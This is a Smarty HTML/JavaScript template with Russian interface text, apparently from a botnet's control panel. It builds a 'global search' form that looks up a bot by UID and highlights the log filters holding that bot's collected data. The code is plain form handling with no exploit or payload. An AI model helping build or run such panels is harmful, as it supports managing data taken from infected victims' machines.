<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Глобальный поиск';
function submit_{$rand_name}(){ldelim}
get_hax(
	{ldelim}
		url:document.forms['search{$rand_name}'].action,
		method: document.forms['search{$rand_name}'].method,
		form: 'search{$rand_name}',
		id: id_{$rand_name} + '_content',
	{rdelim}
);
{rdelim};
</script>
<br />
{if $smarty.post.uid eq ''}
<script language="javascript" type="application/javascript">
$('#cats .file').css('font-weight','normal');
</script>
<form action="/logs/search.html?window=1" name="search{$rand_name}" id="search{$rand_name}" enctype="application/x-www-form-urlencoded" method="post" onsubmit="submit_{$rand_name}(); return false;">
UID: <input name="uid" type="text" style="width: 330px" value="{$smarty.post.uid}" />
<hr />
<input name="submit" type="button" value="Поиск" class="user" onclick="submit_{$rand_name}();" style="width: 100%;" />
</form>
{else}
<script language="javascript" type="application/javascript">
{foreach from=$search item=item}
document.getElementById('c_{$item}').style.fontWeight = 'bold';
{/foreach}
</script>
<div align="center">
Найдено <b>{$search_count}</b> фильтров где есть данные с данного бота.
<br /><br />
Смотрите "Список доступных фильтров", если название фильтра выделенно жирным значит в этом фильтре есть данные с  последенго поиска uid-бота.
<br /><br />
Для того чтоб сбросить глобальный поиск и не было привязки к данному боту в фильтрах загрузите раздел "Логи" заного или откройте заного форму "Глобальный поиск"
</div>
{/if}